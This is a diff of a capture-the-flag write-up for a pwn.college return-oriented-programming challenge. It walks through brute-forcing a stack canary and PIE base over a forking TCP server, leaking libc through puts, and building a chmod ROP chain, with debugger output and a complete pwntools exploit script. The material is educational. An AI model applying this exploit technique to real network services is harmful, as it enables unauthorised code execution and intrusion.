@@ -13738,19 +13738,23 @@ We need the following:
 
 ### Strategy
 
-Three problems to solve: canary, ASLR, and privilege. The server forks a child per connection, the child keeps the same canary and ASLR layout for its entire lifetime. We exploit this across three stages.
+Four problems to solve: canary, PIE, libc, and privilege. The server forks a child per connection, the child keeps the same canary and ASLR layout for its entire lifetime. We exploit this across four stages.
 
-#### Stage 1: Leak libc base and buf address
-
-Unlike Guarded Gadgets, there is no arbitrary read primitive — we cannot simply ask the binary to read an address for us. Instead, we abuse the chain printer. By sending 168 bytes of padding we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched. Entry 13 is `main()`'s saved RIP = `__libc_start_main+243`, which the chain printer then prints back to us. The chain header also prints `rp_`, giving us `buf = rp_ - 72`.
-
-#### Stage 2: Brute-force canary byte-by-byte
+#### Stage 1: Brute-force canary byte-by-byte
 
 The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
 
-#### Stage 3: Send `chmod` chain
+#### Stage 2: Brute-force saved RIP bytes 1–5 → binary base
 
-With canary and libc base known, send the full exploit payload.
+`read()` writes exactly the bytes we send and leaves everything above untouched on the stack. The saved RIP in `challenge()`'s frame equals `binary_base + 0x1726`. Byte 0 (`0x26`) is fixed since `binary_base` is page-aligned. By sending `pad + canary + 0 (rbp) + known_prefix + guess_byte`, the remaining saved RIP bytes stay at their original stack values. The oracle is identical to Stage 1: `### Goodbye!` appears only when the assembled 8-byte saved RIP is valid.
+
+#### Stage 3: Leak libc base via `puts(puts@got)`
+
+With `binary_base` known, chain `pop rdi ; ret` (from the binary) → `puts@got` → `puts@plt`. `puts` prints the 6-byte libc address of `puts`, giving us `libc_base`.
+
+#### Stage 4: `chmod("!", 0o777)`
+
+`"!\x00"` already exists at offset `0x2a32` within libc. Passing `libc_base + 0x2a32` as the `chmod` path eliminates any need for the stack buffer address.
 
 ### Binary analysis
 
@@ -13797,8 +13801,8 @@ Breakpoint 1 at 0x1532
 ```
 pwndbg> run
 Starting program: /challenge/rop-roulette-hard 
-Downloading separate debug info for system-supplied DSO at 0x7ffc87ffa000
-Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc87ffa000.                                                                  
+Downloading separate debug info for system-supplied DSO at 0x7ffdc1482000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffdc1482000.                                                                                   
 ###
 ### Welcome to /challenge/rop-roulette-hard!
 ###
@@ -13806,227 +13810,226 @@ Download failed: Invalid argument.  Continuing without separate debug info for s
 This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but
 unlimited connections.
 
-```
-
-Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.
-
-```
-pwndbg> run
-Starting program: /challenge/rop-roulette-hard 
-Downloading separate debug info for system-supplied DSO at 0x7ffc67f71000
-Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc67f71000.                                                                  
-###
-### Welcome to /challenge/rop-roulette-hard!
-###
-
-This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but
-unlimited connections.
-
-[Attaching after process 3010 fork to child process 3107]
-[New inferior 2 (process 3107)]
+[Attaching after process 1263 fork to child process 1383]
+[New inferior 2 (process 1383)]
 Downloading separate debug info for /challenge/rop-roulette-hard
-Download failed: Invalid argument.  Continuing without separate debug info for /challenge/rop-roulette-hard.                                                                           
-[Detaching after fork from parent process 3010]
-[Inferior 1 (process 3010) detached]
-Downloading separate debug info for system-supplied DSO at 0x7ffc67f71000
-Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc67f71000.                                                                  
-[Switching to process 3107]
+[Detaching after fork from parent process 1263]
+[Inferior 1 (process 1263) detached]
+Downloading separate debug info for system-supplied DSO at 0x7ffdc1482000
 
-Thread 2.1 "rop-roulette-ha" hit Breakpoint 1, 0x00005ad4a46fe532 in challenge ()
+Thread 2.1 "rop-roulette-ha" hit Breakpoint 1, 0x00005f97bb53f532 in challenge ()
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
-────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
-Breakpoint hit at 0x5ad4a46fe532
-────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
- RAX  0x7ffc67e1a2c0 ◂— 0
- RBX  0x5ad4a46fe750 (__libc_csu_init) ◂— endbr64
- RCX  0x7ffc67e1a468 —▸ 0x7ffc67e1ae8c ◂— '/challenge/rop-roulette-hard'
+────────────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────────────────────────────────────────────────────────────────
+Breakpoint hit at 0x5f97bb53f532
+─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffdc145e1f0 ◂— 0
+ RBX  0x5f97bb53f750 (__libc_csu_init) ◂— endbr64
+ RCX  0x7ffdc145e398 —▸ 0x7ffdc145fe8c ◂— '/challenge/rop-roulette-hard'
  RDX  0x1000
  RDI  0
- RSI  0x7ffc67e1a2c0 ◂— 0
+ RSI  0x7ffdc145e1f0 ◂— 0
  R8   0
- R9   0x7cf3a053e540 ◂— 0x7cf3a053e540
- R10  0x7cf3a053e810 ◂— 0xc23 /* '#\x0c' */
+ R9   0x7ac6698bf540 ◂— 0x7ac6698bf540
+ R10  0x7ac6698bf810 ◂— 0x567
  R11  0x246
- R12  0x5ad4a46fe240 (_start) ◂— endbr64
- R13  0x7ffc67e1a460 ◂— 1
+ R12  0x5f97bb53f240 (_start) ◂— endbr64
+ R13  0x7ffdc145e390 ◂— 1
  R14  0
  R15  0
- RBP  0x7ffc67e1a310 —▸ 0x7ffc67e1a370 ◂— 0
- RSP  0x7ffc67e1a290 ◂— 0xd68 /* 'h\r' */
- RIP  0x5ad4a46fe532 (challenge+55) ◂— call read@plt
-─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
- ► 0x5ad4a46fe532 <challenge+55>    call   read@plt                    <read@plt>
-        fd: 0 (socket:[1385737291])
-        buf: 0x7ffc67e1a2c0 ◂— 0
+ RBP  0x7ffdc145e240 —▸ 0x7ffdc145e2a0 ◂— 0
+ RSP  0x7ffdc145e1c0 ◂— 0xd68 /* 'h\r' */
+ RIP  0x5f97bb53f532 (challenge+55) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
+ ► 0x5f97bb53f532 <challenge+55>    call   read@plt                    <read@plt>
+        fd: 0 (socket:[1409589517])
+        buf: 0x7ffdc145e1f0 ◂— 0
         nbytes: 0x1000
  
-   0x5ad4a46fe537 <challenge+60>    mov    dword ptr [rbp - 0x54], eax
-   0x5ad4a46fe53a <challenge+63>    lea    rdi, [rip + 0xac7]              RDI => 0x5ad4a46ff008 ◂— 'Leaving!'
-   0x5ad4a46fe541 <challenge+70>    call   puts@plt                    <puts@plt>
+   0x5f97bb53f537 <challenge+60>    mov    dword ptr [rbp - 0x54], eax
+   0x5f97bb53f53a <challenge+63>    lea    rdi, [rip + 0xac7]              RDI => 0x5f97bb540008 ◂— 'Leaving!'
+   0x5f97bb53f541 <challenge+70>    call   puts@plt                    <puts@plt>
  
-   0x5ad4a46fe546 <challenge+75>    nop   
-   0x5ad4a46fe547 <challenge+76>    mov    rcx, qword ptr [rbp - 8]
-   0x5ad4a46fe54b <challenge+80>    xor    rcx, qword ptr fs:[0x28]
-   0x5ad4a46fe554 <challenge+89>    je     challenge+96                <challenge+96>
+   0x5f97bb53f546 <challenge+75>    nop   
+   0x5f97bb53f547 <challenge+76>    mov    rcx, qword ptr [rbp - 8]
+   0x5f97bb53f54b <challenge+80>    xor    rcx, qword ptr fs:[0x28]
+   0x5f97bb53f554 <challenge+89>    je     challenge+96                <challenge+96>
  
-   0x5ad4a46fe556 <challenge+91>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
+   0x5f97bb53f556 <challenge+91>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
  
-   0x5ad4a46fe55b <challenge+96>    leave 
-   0x5ad4a46fe55c <challenge+97>    ret   
-───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
-00:0000│ rsp     0x7ffc67e1a290 ◂— 0xd68 /* 'h\r' */
-01:0008│-078     0x7ffc67e1a298 —▸ 0x7ffc67e1a478 —▸ 0x7ffc67e1aea9 ◂— 'SHELL=/run/dojo/bin/bash'
-02:0010│-070     0x7ffc67e1a2a0 —▸ 0x7ffc67e1a468 —▸ 0x7ffc67e1ae8c ◂— '/challenge/rop-roulette-hard'
-03:0018│-068     0x7ffc67e1a2a8 ◂— 0x1a46ff0a3
-04:0020│-060     0x7ffc67e1a2b0 —▸ 0x5ad4a4701010 (stdout@@GLIBC_2.2.5) —▸ 0x7cf3a05386a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
-05:0028│-058     0x7ffc67e1a2b8 —▸ 0x7cf3a05344a0 (_IO_file_jumps) ◂— 0
-06:0030│ rax rsi 0x7ffc67e1a2c0 ◂— 0
-07:0038│-048     0x7ffc67e1a2c8 —▸ 0x7cf3a03dbe93 (_IO_file_overflow+275) ◂— cmp eax, -1
-─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
- ► 0   0x5ad4a46fe532 challenge+55
-   1   0x5ad4a46fe726 main+457
-   2   0x7cf3a036f083 __libc_start_main+243
-   3   0x5ad4a46fe26e _start+46
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   0x5f97bb53f55b <challenge+96>    leave 
+   0x5f97bb53f55c <challenge+97>    ret   
+───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffdc145e1c0 ◂— 0xd68 /* 'h\r' */
+01:0008│-078     0x7ffdc145e1c8 —▸ 0x7ffdc145e3a8 —▸ 0x7ffdc145fea9 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-070     0x7ffdc145e1d0 —▸ 0x7ffdc145e398 —▸ 0x7ffdc145fe8c ◂— '/challenge/rop-roulette-hard'
+03:0018│-068     0x7ffdc145e1d8 ◂— 0x1bb5400a3
+04:0020│-060     0x7ffdc145e1e0 —▸ 0x5f97bb542010 (stdout@@GLIBC_2.2.5) —▸ 0x7ac6698b96a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-058     0x7ffdc145e1e8 —▸ 0x7ac6698b54a0 (_IO_file_jumps) ◂— 0
+06:0030│ rax rsi 0x7ffdc145e1f0 ◂— 0
+07:0038│-048     0x7ffdc145e1f8 —▸ 0x7ac66975ce93 (_IO_file_overflow+275) ◂— cmp eax, -1
+─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5f97bb53f532 challenge+55
+   1   0x5f97bb53f726 main+457
+   2   0x7ac6696f0083 __libc_start_main+243
+   3   0x5f97bb53f26e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
 - [ ] Offset between buffer and stack canary
-   - Location of the buffer: `0x7ffc67e1a2c0`
-- [ ] Offset between buffer and stored return address to `main()`
-   - Location of the buffer: `0x7ffc67e1a2c0`
+   - Location of the buffer: `0x7ffdc145e1f0`
+- [ ] Offset between buffer and stored return address to `challenge()`
+   - Location of the buffer: `0x7ffdc145e1f0`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
 ```
 pwndbg> info frame
-Stack level 0, frame at 0x7ffc67e1a320:
- rip = 0x5ad4a46fe532 in challenge; saved rip = 0x5ad4a46fe726
- called by frame at 0x7ffc67e1a380
- Arglist at 0x7ffc67e1a310, args: 
- Locals at 0x7ffc67e1a310, Previous frame's sp is 0x7ffc67e1a320
+Stack level 0, frame at 0x7ffdc145e250:
+ rip = 0x5f97bb53f532 in challenge; saved rip = 0x5f97bb53f726
+ called by frame at 0x7ffdc145e2b0
+ Arglist at 0x7ffdc145e240, args: 
+ Locals at 0x7ffdc145e240, Previous frame's sp is 0x7ffdc145e250
  Saved registers:
-  rbp at 0x7ffc67e1a310, rip at 0x7ffc67e1a318
+  rbp at 0x7ffdc145e240, rip at 0x7ffdc145e248
 ```
 
 ```
-pwndbg> p/d 0x7ffc67e1a308 - 0x7ffc67e1a2c0
+pwndbg> p/d 0x7ffdc145e238 - 0x7ffdc145e1f0
 $1 = 72
-pwndbg> p/d 0x7ffc67e1a318 - 0x7ffc67e1a2c0
+pwndbg> p/d 0x7ffdc145e248 - 0x7ffdc145e1f0
 $2 = 88
 ```
 
-- [x] Offset between buffer and stack canary: `76`
-   - Location of the buffer: `0x7ffc67e1a2c0`
-   - Location of the canary: `0x7ffc67e1a310 - 8` = `0x7ffc67e1a308`
-- [x] Offset between buffer and stored return address: `88`
-   - Location of the buffer: `0x7ffc67e1a2c0`
-   - Location of the stored return address: `0x7ffc67e1a318`
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
+- [x] Offset between buffer and stored return address to `challenge()`: `88`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the stored return address: `0x7ffdc145e248`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
 ### ROP gadgets
 
+#### Binary
+
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /challenge/rop-roulette-hard | grep "pop rdi ; ret"
+0x00000000000017b3 : pop rdi ; ret
+```
+
+```
+hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "from pwn import *; e = ELF('/challenge/rop-roulette-hard', checksec=False); print('puts@plt:', hex(e.plt.puts), 'puts@got:', hex(e.got.puts))"
+puts@plt: 0x1154 puts@got: 0x3f60
+```
+
+#### Libc
+
+```
+hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
 0x0000000000023b6a : pop rdi ; ret
 ```
 
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
+hacker@return-oriented-programming~rop-roulette-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
 0x000000000002601f : pop rsi ; ret
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
+- [x] Offset between buffer and stored return address to `challenge()`: `88`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the stored return address: `0x7ffdc145e248`
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - Binary: `pop rdi ; ret`: `0x17b3`
+   - Binary: `puts@plt`: `0x1154`
+   - Binary: `puts@got`: `0x3f60`
+   - Libc: `pop rdi ; ret`: `0x23b6a`
+   - Libc: `pop rsi ; ret`: `0x2601f`
 
 ### Libc functions
 
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+hacker@return-oriented-programming~rop-roulette-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
   1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
 ```
 
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
-   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+hacker@return-oriented-programming~rop-roulette-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
    631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
-  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
-  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address: `72`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+```
+hacker@return-oriented-programming~rop-roulette-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "\bputs\b"
+   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
+```
+
+```
+hacker@return-oriented-programming~rop-roulette-hard:~$ python3 -c "d=open('/lib/x86_64-linux-gnu/libc.so.6','rb').read(); print(hex(d.index(b'!\x00')))"
+0x2a32
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the canary: `0x7ffdc145e240 - 8` = `0x7ffdc145e238`
+- [x] Offset between buffer and stored return address to `challenge()`: `88`
+   - Location of the buffer: `0x7ffdc145e1f0`
+   - Location of the stored return address: `0x7ffdc145e248`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
+   - Offset of `puts()` within Libc: `0x84420`
+   - Offset of `"!\x00"` string within Libc: `0x2a32`
 - [x] Locations of required ROP gadgets
-   - `pop rdi ; ret`: `0x23b6a`
-   - `pop rsi ; ret`: `0x2601f`
+   - Binary: `pop rdi ; ret`: `0x17b3`
+   - Binary: `puts@plt`: `0x1154`
+   - Binary: `puts@got`: `0x3f60`
+   - Libc: `pop rdi ; ret`: `0x23b6a`
+   - Libc: `pop rsi ; ret`: `0x2601f`
 
-### Leaking libc base and buf address
+### Leaking binary base
 
-There is no arbitrary read primitive in this challenge, unlike Guarded Gadgets where the binary asks "Address in hex to read from:". Instead, by sending 168 bytes of `A`s we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched — this is `main()`'s saved RIP = `__libc_start_main+243`, because that is who called `main()`. The chain printer prints it back to us. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
-
-The saved RIP value comes from the backtrace:
-
-```
-2   0x7bb94ef0d083 __libc_start_main+243
-```
-
-Let's now find the offset of `__libc_start_main` within Libc.
+The saved RIP in `challenge()`'s frame comes from the backtrace:
 
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "__libc_start_main"
-512: 0000000000023f90   392 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.34
+1   0x5f97bb53f726 main+457
 ```
 
-So, `__libc_start_main` is at an offset of `0x23f90` within Libc, therefore `__libc_start_main+243` is at offset `0x23f90 + 243 = 0x24083` within Libc.
+`challenge()`'s saved RIP = `0x5f97bb53f726` = `binary_base + 0x1726`. Byte 0 is `0x26` (fixed — `binary_base & 0xFF == 0` due to page alignment). Bytes 1–5 are random. Bytes 6–7 are always `0x00` (48-bit user-space address) and are never written.
 
-Let's get the base of Libc.
-
-```
-pwndbg> p/x 0x7bb94ef0d083 - 0x24083
-$4 = 0x7bb94eee9000   ← libc base (page-aligned ✓)
-```
-
-- `buf = rp_ - 72`
-- Saved RIP value: `0x7bb94ef0d083`
-- `__libc_start_main+243` libc offset: `0x24083`
-- libc base: `0x7bb94ef0d083 - 0x24083 = 0x7bb94eee9000`
-
-From there all function and gadget addresses follow:
+By brute-forcing bytes 1–5 with the `### Goodbye!` oracle — the same oracle used for the canary — we recover the full saved RIP and compute:
 
 ```
-pop_rdi = 0x7bb94eee9000 + 0x23b6a = 0x7bb94ef0cb6a
-pop_rsi = 0x7bb94eee9000 + 0x2601f = 0x7bb94ef0f01f
-chmod   = 0x7bb94eee9000 + 0x10dd80 = 0x7bb94eff6d80
+binary_base = saved_rip - 0x1726
+```
+
+### Leaking libc base
+
+With `binary_base` known, `puts@plt` and `puts@got` are at known addresses. We call `puts(puts@got)` which prints the 6-byte runtime address of `puts` in libc. Then:
+
+```
+hacker@return-oriented-programming~rop-roulette-hard:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "\bputs\b"
+   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
+```
+
+```
+libc_base = leaked_puts - 0x84420
 ```
 
 ### ROP chain
 
-The ROP chain would be the exact same as the [easy challenge](#rop-chain-4). 
+Same as the [easy version](#rop-chain-4).
 
 ### Exploit
 
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ ln -sf /flag ~/!
+hacker@return-oriented-programming~rop-roulette-hard:~$ ln -sf /flag ~/!
 ```
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
-import re
 
 context.arch = 'amd64'
 context.log_level = 'error'
@@ -14034,47 +14037,25 @@ context.log_level = 'error'
 host = 'localhost'
 port = 1337
 
-# Libc offsets
-lsm_243_off = 0x24083   # __libc_start_main+243
-pop_rdi_off = 0x23b6a
-pop_rsi_off = 0x2601f
-chmod_off   = 0x10dd80
+puts_libc_off = 0x84420
+pop_rdi_off   = 0x23b6a
+pop_rsi_off   = 0x2601f
+chmod_off     = 0x10dd80
+bang_off      = 0x2a32  # "!\x00" string in libc .rodata
 
-canary_off = 56
-rip_off    = 72
+ret_addr_off  = 0x1726
+pop_rdi_bin   = 0x17b3
+puts_plt_off  = 0x1154
+puts_got_off  = 0x3f60
+ret_off       = 0x101a
+
+canary_off = 72
+rip_fixed  = bytes([ret_addr_off & 0xFF])
 
 def connect():
-    p = remote(host, port)
-    p.recvuntil(b'scenario.\n')
-    return p
+    return remote(host, port)
 
-# --- STAGE 1: Leak libc base and buf address via chain printer ---
-# Send 168 bytes: overwrites chain entries 1–12, leaves entry 13 (main's saved RIP
-# = __libc_start_main+243) untouched. Chain header prints rp_ → buf = rp_ - 72.
-print('[*] Stage 1: Leaking libc base and buf...')
-
-p = connect()
-p.send(b'A' * 168)
-raw = p.recvall(timeout=3).decode(errors='ignore')
-p.close()
-
-rp_       = int(re.search(r'ROP chain at (0x[0-9a-f]+)', raw).group(1), 16)
-buf       = rp_ - rip_off
-entries   = re.findall(r'\| (0x[0-9a-f]+):', raw)
-libc_base = int(entries[-1], 16) - lsm_243_off
-
-assert libc_base & 0xfff == 0, f'libc base misaligned: {hex(libc_base)}'
-print(f'[+] buf:       {hex(buf)}')
-print(f'[+] libc base: {hex(libc_base)}')
-
-pop_rdi = libc_base + pop_rdi_off
-pop_rsi = libc_base + pop_rsi_off
-chmod   = libc_base + chmod_off
-
-# --- STAGE 2: Brute-force canary byte-by-byte ---
-# Oracle: ### Goodbye! at end of output = canary intact = correct byte.
-print('[*] Stage 2: Brute-forcing canary...')
-
+print('[*] Stage 1: Brute-forcing canary...')
 known_canary = b'\x00'
 for i in range(7):
     found_byte = False
@@ -14092,48 +14073,66 @@ for i in range(7):
         except Exception:
             pass
     if not found_byte:
-        print(f'[!] Failed at byte {i+1}')
-        exit()
+        print(f'[!] Failed at canary byte {i+1}'); exit()
 
 canary = u64(known_canary)
 print(f'[*] Canary: {hex(canary)}')
 
-# --- STAGE 3: Send chmod chain ---
-# Write "!\x00" at buf so buf itself is the path argument.
-# ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
-print('[*] Stage 3: Sending chmod chain...')
+print('[*] Stage 2: Brute-forcing saved RIP...')
+known_rip = rip_fixed
+for i in range(5):
+    found_byte = False
+    for byte_guess in range(256):
+        try:
+            p = connect()
+            p.send(flat(b'A' * canary_off, p64(canary), p64(0), known_rip + p8(byte_guess)))
+            out = p.recvall(timeout=1)
+            p.close()
+            if b'Goodbye' in out:
+                known_rip += p8(byte_guess)
+                print(f'[+] Byte {i+1}: {hex(byte_guess)} | rip: 0x{known_rip.hex()}')
+                found_byte = True
+                break
+        except Exception:
+            pass
+    if not found_byte:
+        print(f'[!] Failed at RIP byte {i+1}'); exit()
 
+saved_rip   = u64(known_rip + b'\x00\x00')
+binary_base = saved_rip - ret_addr_off
+assert binary_base & 0xfff == 0
+print(f'[*] Binary base: {hex(binary_base)}')
+
+pop_rdi_b = binary_base + pop_rdi_bin
+puts_plt  = binary_base + puts_plt_off
+puts_got  = binary_base + puts_got_off
+ret       = binary_base + ret_off
+
+print('[*] Stage 3: Leaking libc base...')
 p = connect()
-p.send(flat(
-    b'!\x00' + b'A' * (canary_off - 2),
-    p64(canary),
-    p64(0),
-    pop_rdi, buf,
-    pop_rsi, 0o777,
-    chmod,
-))
-p.recvall(timeout=2)
+p.send(flat(b'A' * canary_off, p64(canary), p64(0), ret, pop_rdi_b, puts_got, puts_plt))
+raw = p.recvall(timeout=3)
 p.close()
 
-print(open('/flag').read())
-```
+lines       = [l for l in raw.split(b'\n') if l]
+leaked_puts = u64(lines[-1].ljust(8, b'\x00'))
+libc_base   = leaked_puts - puts_libc_off
+assert libc_base & 0xfff == 0
+print(f'[*] Libc base: {hex(libc_base)}')
 
-```
-hacker@return-oriented-programming~rop-roulette-easy:~$ python ~/script.py
-[*] Stage 1: Leaking libc base and buf...
-[+] buf:       0x7ffe3fe854d0
-[+] libc base: 0x78a11c3c6000
-[*] Stage 2: Brute-forcing canary...
-[+] Byte 1: 0x76 | canary: 0x0076
-[+] Byte 2: 0x7 | canary: 0x007607
-[+] Byte 3: 0x8f | canary: 0x0076078f
-[+] Byte 4: 0xa2 | canary: 0x0076078fa2
-[+] Byte 5: 0x60 | canary: 0x0076078fa260
-[+] Byte 6: 0x3f | canary: 0x0076078fa2603f
-[+] Byte 7: 0x23 | canary: 0x0076078fa2603f23
-[*] Canary: 0x233f60a28f077600
-[*] Stage 3: Sending chmod chain...
-pwn.college{UP5vZhPaAtVu_qG_L993WkbHfNH.01N2MDL4ITM0EzW}
-```
+pop_rdi = libc_base + pop_rdi_off
+pop_rsi = libc_base + pop_rsi_off
+chmod   = libc_base + chmod_off
+bang    = libc_base + bang_off
 
-&nbsp;
+print('[*] Stage 4: Sending chmod chain...')
+p = connect()
+p.send(flat(b'A' * canary_off, p64(canary), p64(0), pop_rdi, bang, pop_rsi, 0o777, chmod))
+p.recvall(timeout=3)
+p.close()
+
+try:
+    print(open('/flag').read())
+except PermissionError:
+    print('[-] chmod failed')
+```
